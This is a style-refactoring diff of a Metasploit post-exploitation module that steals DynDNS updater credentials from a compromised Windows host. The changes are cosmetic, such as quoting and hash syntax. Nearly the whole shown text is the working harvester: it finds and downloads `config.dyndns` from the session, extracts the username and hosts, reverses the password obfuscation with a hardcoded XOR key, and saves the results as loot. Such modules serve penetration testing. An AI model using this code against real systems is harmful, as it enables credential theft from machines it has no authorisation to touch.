@@ -46,19 +46,19 @@ class MetasploitModule < Msf::Post
   def get_config_file
     config_paths =
       [
-        "C:\\ProgramData\\Dyn\\Updater\\", # Vista
-        "C:\\Documents and Settings\\All Users\\Application Data\\Dyn\\Updater\\" # XP and else
+        'C:\\ProgramData\\Dyn\\Updater\\', # Vista
+        'C:\\Documents and Settings\\All Users\\Application Data\\Dyn\\Updater\\' # XP and else
       ]
 
     # Give me the first match
     config_file = nil
     config_paths.each do |p|
-      tmp_path = p + "config.dyndns"
+      tmp_path = p + 'config.dyndns'
       begin
         f = session.fs.file.stat(tmp_path)
         config_file = tmp_path
         break # We've found a valid one, break!
-      rescue
+      rescue StandardError
       end
     end
 
@@ -70,13 +70,11 @@ class MetasploitModule < Msf::Post
   # Return the content.
   #
   def load_config_file(config_file)
-    f = session.fs.file.new(config_file, "rb")
+    f = session.fs.file.new(config_file, 'rb')
     content = ''
-    until f.eof?
-      content << f.read
-    end
-    p = store_loot("dyndns.raw", "text/plain", session, "dyndns_raw_config.dyndns")
-    vprint_good("Raw config file saved: #{p.to_s}")
+    content << f.read until f.eof?
+    p = store_loot('dyndns.raw', 'text/plain', session, 'dyndns_raw_config.dyndns')
+    vprint_good("Raw config file saved: #{p}")
     return content
   end
 
@@ -92,14 +90,14 @@ class MetasploitModule < Msf::Post
     host = content.scan(/Host\d=([\x21-\x7e]+)/)[0]
 
     # Let's decode the pass
-    pass = decode_password(pass) if not pass.nil?
+    pass = decode_password(pass) if !pass.nil?
 
     # Store data in a hash, save it to the array
     # Might contain nil if nothing was regexed
     config_data = {
-      :user => user,
-      :pass => pass,
-      :hosts => host
+      user: user,
+      pass: pass,
+      hosts: host
     }
 
     return config_data
@@ -114,7 +112,7 @@ class MetasploitModule < Msf::Post
     c = 0
 
     pass.each_byte do |a1|
-      a2 = "t6KzXhCh"[c, 1].unpack('c')[0].to_i
+      a2 = 't6KzXhCh'[c, 1].unpack('c')[0].to_i
       s << (a1 ^ a2).chr
       c = ((c + 1) % 8)
     end
@@ -141,7 +139,7 @@ class MetasploitModule < Msf::Post
     # Store username/password
     cred << [data[:user], data[:pass]]
 
-    if not creds.rows.empty?
+    if !creds.rows.empty?
       p = store_loot(
         'dyndns.creds',
         'text/csv',
@@ -150,7 +148,7 @@ class MetasploitModule < Msf::Post
         'dyndns_creds.csv',
         'DynDNS Credentials'
       )
-      print_status("Parsed creds stored in: #{p.to_s}")
+      print_status("Parsed creds stored in: #{p}")
     end
 
     # Store all found hosts
@@ -161,7 +159,7 @@ class MetasploitModule < Msf::Post
 
     print_status(tbl.to_s)
 
-    if not tbl.rows.empty?
+    if !tbl.rows.empty?
       p = store_loot(
         'dyndns.data',
         'text/plain',
@@ -170,7 +168,7 @@ class MetasploitModule < Msf::Post
         'dyndns_data.csv',
         'DynDNS Client Data'
       )
-      print_status("Parsed data stored in: #{p.to_s}")
+      print_status("Parsed data stored in: #{p}")
     end
   end
 
@@ -181,16 +179,16 @@ class MetasploitModule < Msf::Post
     # Find the config file
     config_file = get_config_file
     if config_file.nil?
-      print_error("No config file found, will not continue")
+      print_error('No config file found, will not continue')
       return
     end
 
     # Load the config file
-    print_status("Downloading config.dyndns...")
+    print_status('Downloading config.dyndns...')
     content = load_config_file(config_file)
 
     if content.empty?
-      print_error("Config file seems empty, will not continue")
+      print_error('Config file seems empty, will not continue')
       return
     end
 
